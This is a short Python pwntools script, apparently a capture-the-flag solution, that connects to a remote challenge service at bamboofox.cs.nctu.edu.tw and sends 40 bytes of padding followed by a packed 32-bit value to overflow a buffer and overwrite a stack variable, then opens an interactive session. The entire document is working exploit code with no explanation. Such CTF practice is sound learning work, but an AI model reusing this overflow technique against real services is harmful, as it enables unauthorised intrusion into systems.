#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 22001)
# r = process('./binary_100')

r.sendline('a' * 40 + p32(0xABCD1234))

r.interactive()
